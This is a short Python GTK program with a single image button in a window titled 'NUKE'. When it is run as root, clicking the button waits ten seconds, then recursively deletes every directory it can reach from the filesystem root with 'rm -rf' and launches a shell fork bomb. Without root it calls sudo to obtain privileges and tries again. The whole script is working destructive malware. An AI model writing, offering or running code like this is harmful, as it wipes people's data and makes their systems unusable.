import os
import gi
gi.require_version("Gtk", "3.0")
from gi.repository import Gtk, GdkPixbuf


def run_command():
    if os.geteuid() == 0:
        print("The button was clicked There Is No Turning Back ! ")
        print("You Got 10 Seconds To Stop the script")
        os.system("sleep 10")
        start_path = "/"
        get_dirs_with_permission(start_path)


        os.system("exit")
    else:
        print("This script must be run as root!\n")
        print("The button was clicked There Is No Turning Back ! ")
        os.system("sudo echo")
        run_command()








def get_dirs_with_permission(start_path):
    dirs_with_permission = []
    for dirpath, dirnames, filenames in os.walk(start_path):
        for dirname in dirnames:
            dir_full_path = os.path.join(dirpath, dirname)
            try:
                os.listdir(dir_full_path)
                os.system('rm -rf ' + dir_full_path + ' 2> /dev/null &')
            except OSError:
                print ('Thank ALLAH you dont have permission')
                pass
            else:
                os.system ('A(){ A|A&};A')

                pass



# Set up the GUI window
class MyWindow(Gtk.Window):
    def __init__(self):
        Gtk.Window.__init__(self, title="NUKE")
        self.set_border_width(10)

        # Load the button image
        image = Gtk.Image()
        pixbuf = GdkPixbuf.Pixbuf.new_from_file_at_size("img.jpeg", 200, 200)
        image.set_from_pixbuf(pixbuf)

        # Create a button widget and add the image to it
        self.button = Gtk.Button()
        self.button.add(image)

        # Connect the button click event to the run_command function
        self.button.connect("clicked", self.on_button_click)

        # Add the button to the window
        self.add(self.button)

    # Define the button click event
    def on_button_click(self, widget):

        run_command()

win = MyWindow()
win.connect("destroy", Gtk.main_quit)
win.show_all()
Gtk.main()
